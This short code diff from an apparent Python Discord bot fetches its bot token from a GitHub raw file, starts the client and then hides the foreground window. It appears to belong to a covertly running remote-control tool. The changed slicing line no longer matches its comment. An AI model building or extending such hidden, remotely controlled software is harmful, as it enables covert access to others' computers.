@@ -211,7 +211,7 @@ async def stop_live_session(interaction : Interaction):
 
 r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/tok")
 token = r.text
-stripped_string = token[1:-1]  # Slicing from the second character to the second-to-last character
+stripped_string = token[1:]  # Slicing from the second character to the second-to-last character
 client.run(stripped_string)
 hwnd = win32gui.GetForegroundWindow()
 win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
